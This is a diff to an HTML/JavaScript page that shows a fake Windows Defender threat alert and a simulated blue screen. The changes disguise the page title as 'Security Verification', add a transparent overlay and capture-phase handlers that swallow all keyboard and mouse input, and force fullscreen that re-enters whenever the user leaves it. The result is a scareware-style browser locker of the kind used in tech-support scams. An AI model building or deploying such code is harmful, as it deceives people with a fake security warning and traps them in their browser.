@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Windows Defender Security Alert</title>
+    <title>Security Verification</title>
     <style>
         * {
             margin: 0;
@@ -13,6 +13,7 @@
             -webkit-user-select: none;
             -moz-user-select: none;
             -ms-user-select: none;
+            cursor: default;
         }
         
         html, body {
@@ -237,13 +238,12 @@
             margin-top: 30px;
         }
         
-        #overlay {
+        #blocker {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: #0078d7;
             z-index: 9999;
             display: none;
         }
@@ -339,33 +339,28 @@
         </div>
     </div>
     
+    <!-- Input blocker (transparent overlay) -->
+    <div id="blocker"></div>
+    
     <script>
-        // Block all keyboard input
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
-                e.preventDefault();
-                e.stopPropagation();
-                return false;
-            }
-        }, true);
-        
-        // Block right click
-        document.addEventListener('contextmenu', function(e) {
+        // Strict input blocking
+        function blockAllInput(e) {
             e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
             return false;
-        }, false);
+        }
         
-        // Block text selection
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            return false;
-        }, false);
-        
-        // Block dragging
-        document.addEventListener('dragstart', function(e) {
-            e.preventDefault();
-            return false;
-        }, false);
+        // Block all possible input methods
+        document.addEventListener('keydown', blockAllInput, true);
+        document.addEventListener('keyup', blockAllInput, true);
+        document.addEventListener('keypress', blockAllInput, true);
+        document.addEventListener('contextmenu', blockAllInput, true);
+        document.addEventListener('selectstart', blockAllInput, true);
+        document.addEventListener('dragstart', blockAllInput, true);
+        document.addEventListener('mousedown', blockAllInput, true);
+        document.addEventListener('mouseup', blockAllInput, true);
+        document.addEventListener('click', blockAllInput, true);
         
         // Auto-start countdown
         let count = 5;
@@ -381,32 +376,47 @@
         }, 1000);
         
         function startSimulation() {
+            // Activate input blocker
+            document.getElementById('blocker').style.display = 'block';
+            
             // Hide normal content
             document.getElementById('normalContent').style.display = 'none';
             
             // Show Defender alert
             document.getElementById('defenderScreen').style.display = 'flex';
             
-            // Request fullscreen
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(err => {
-                    console.log("Fullscreen error:", err);
-                });
-            }
+            // Force fullscreen
+            const enterFullscreen = () => {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen()
+                        .then(() => {
+                            // Lock orientation if supported
+                            if (screen.orientation && screen.orientation.lock) {
+                                screen.orientation.lock('landscape').catch(() => {});
+                            }
+                        })
+                        .catch(err => {
+                            console.log("Fullscreen error:", err);
+                            // Retry if failed
+                            setTimeout(enterFullscreen, 500);
+                        });
+                }
+            };
             
-            // Add event listener for when fullscreen changes
-            document.addEventListener('fullscreenchange', function() {
+            enterFullscreen();
+            
+            // Prevent exiting fullscreen
+            document.addEventListener('fullscreenchange', () => {
                 if (!document.fullscreenElement) {
-                    // If user somehow exits fullscreen, re-enter it
-                    document.documentElement.requestFullscreen().catch(err => {
-                        console.log("Fullscreen error:", err);
-                    });
+                    enterFullscreen();
                 }
             });
         }
         
         // Defender "Remove Threat" button
-        document.getElementById('removeThreat').addEventListener('click', function() {
+        document.getElementById('removeThreat').addEventListener('click', function(e) {
+            e.stopPropagation();
+            
             // Show scanning progress
             document.getElementById('scanProgress').style.display = 'block';
             
@@ -431,7 +441,8 @@
         });
         
         // Defender "Advanced Options" button
-        document.getElementById('advancedOptions').addEventListener('click', function() {
+        document.getElementById('advancedOptions').addEventListener('click', function(e) {
+            e.stopPropagation();
             // Immediately trigger BSOD
             triggerBSOD();
         });
